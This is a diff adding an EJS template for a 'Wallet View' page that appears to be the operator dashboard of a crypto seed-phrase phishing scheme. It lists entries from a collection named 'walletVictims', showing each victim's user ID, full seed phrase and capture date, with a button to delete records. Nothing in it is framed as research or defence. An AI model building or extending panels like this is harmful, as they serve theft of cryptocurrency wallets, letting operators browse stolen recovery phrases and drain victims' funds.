@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet View</title>
+    <link rel="stylesheet" href="/css/wallet-view.css">
+</head>
+
+<body>
+
+    <h2>Wallet View</h2>
+    <a href="/dashboard" class="back-to-dashboard">Back to Dashboard</a>
+    <ul>
+        <% if (walletVictims && walletVictims.length > 0) { %>
+            <% walletVictims.forEach(wallet => { %>
+                <li>
+                    <div class="details">
+                        <strong>User ID: <p><%= wallet.userId %></p></strong>
+                        <strong>Seed Phrase: <p><%= wallet.seedPhrase.join(', ') %></p></strong>
+                        <strong>Date: <p><%= wallet.date.toLocaleString() %></p></strong>
+                    </div>
+    
+                    <form action="/delete-wallet/<%= wallet._id %>" method="POST" style="display:inline;">
+                        <button type="submit">Delete</button>
+                    </form>
+                </li>
+            <% }); %>
+        <% } else { %>
+            <p>No wallet data found.</p>
+        <% } %>
+    </ul>
+    
+
+</body>
+
+</html>
